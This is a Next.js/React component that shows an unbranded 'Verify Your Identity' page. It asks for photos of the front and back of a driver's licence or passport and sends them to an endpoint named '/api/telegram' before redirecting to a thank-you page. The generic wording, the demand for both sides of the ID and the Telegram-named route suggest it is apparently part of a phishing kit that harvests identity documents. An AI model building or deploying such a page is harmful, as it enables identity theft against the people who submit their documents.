"use client";
import { useState, useEffect } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";

interface ImageUploadProps {
  label: string;
  previewUrl: string | null;
  onImageChange: (file: File | null) => void;
  isMobile: boolean;
}

const ImageUpload: React.FC<ImageUploadProps> = ({ label, previewUrl, onImageChange, isMobile }) => {
  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files ? e.target.files[0] : null;
    onImageChange(file);
  };

  return (
    <div className="flex flex-col items-center">
      <h3 className="text-lg font-semibold mb-2">{label}</h3>
      {previewUrl ? (
        <Image 
          src={previewUrl} 
          alt={`${label} Preview`} 
          width={250} 
          height={150} 
          className="rounded-lg object-cover mb-3" 
        />
      ) : (
        <div className="w-full h-56 border-4 border-dashed border-gray-300 flex items-center justify-center rounded-lg bg-gray-100 text-gray-500 mb-3">
          📸
        </div>
      )}
      <div className="flex gap-2">
        {isMobile && (
          <label htmlFor={`${label.toLowerCase()}-camera`} className="bg-blue-500 text-white px-4 py-2 rounded-md cursor-pointer">
            📸 Snap Photo
          </label>
        )}
        <label htmlFor={`${label.toLowerCase()}-gallery`} className="bg-green-500 text-white px-4 py-2 rounded-md cursor-pointer">
          📂 Upload
        </label>
        {isMobile && (
          <input
            type="file"
            id={`${label.toLowerCase()}-camera`}
            accept="image/*"
            capture="environment"
            className="hidden"
            onChange={handleFileChange}
          />
        )}
        <input
          type="file"
          id={`${label.toLowerCase()}-gallery`}
          accept="image/*"
          className="hidden"
          onChange={handleFileChange}
        />
      </div>
    </div>
  );
};

const IdentityVerificationForm = () => {
  const [frontImage, setFrontImage] = useState<File | null>(null);
  const [backImage, setBackImage] = useState<File | null>(null);
  const [frontPreview, setFrontPreview] = useState<string | null>(null);
  const [backPreview, setBackPreview] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  const router = useRouter();

  useEffect(() => {
    setIsMobile(/Mobi|Android/i.test(navigator.userAgent));
    
    // Clean up object URLs to avoid memory leaks
    return () => {
      if (frontPreview) URL.revokeObjectURL(frontPreview);
      if (backPreview) URL.revokeObjectURL(backPreview);
    };
  }, [frontPreview, backPreview]);

  const handleImageChange = (side: "front" | "back", file: File | null) => {
    if (!file) return;

    if (file.size > 5 * 1024 * 1024) {
      setError("File size exceeds 5MB. Please upload a smaller file.");
      return;
    }

    setError(null);
    const previewUrl = URL.createObjectURL(file);

    if (side === "front") {
      // Revoke previous URL if exists
      if (frontPreview) URL.revokeObjectURL(frontPreview);
      setFrontImage(file);
      setFrontPreview(previewUrl);
    } else {
      if (backPreview) URL.revokeObjectURL(backPreview);
      setBackImage(file);
      setBackPreview(previewUrl);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!frontImage || !backImage) {
      setError("Both front and back images are required.");
      return;
    }

    setIsSubmitting(true);
    setError(null);
    
    try {
      const formData = new FormData();
      formData.append('frontImage', frontImage);
      formData.append('backImage', backImage);

      const response = await fetch('/api/telegram', {
        method: 'POST',
        body: formData,
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.error || 'Failed to submit images');
      }

      router.push("/thankyou");
    } catch (error) {
      console.error("Error submitting images:", error);
      setError(error instanceof Error ? error.message : "Submission failed. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 p-6">
      <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
        <h2 className="text-3xl font-semibold text-gray-800 text-center mb-4">Verify Your Identity</h2>
        <p className="text-center text-gray-600 mb-6">Upload images of your <strong>Drivers License</strong> or <strong>Passport</strong>.</p>

        <form onSubmit={handleSubmit} className="space-y-6">
          <ImageUpload
            label="Front of ID"
            previewUrl={frontPreview}
            onImageChange={(file) => handleImageChange("front", file)}
            isMobile={isMobile}
          />

          <ImageUpload
            label="Back of ID"
            previewUrl={backPreview}
            onImageChange={(file) => handleImageChange("back", file)}
            isMobile={isMobile}
          />

          {error && <p className="text-red-600 text-sm text-center">{error}</p>}

          <button
            type="submit"
            className="w-full bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 transition-all disabled:bg-blue-300"
            disabled={isSubmitting || !frontImage || !backImage}
          >
            {isSubmitting ? "Submitting..." : "Submit"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default IdentityVerificationForm;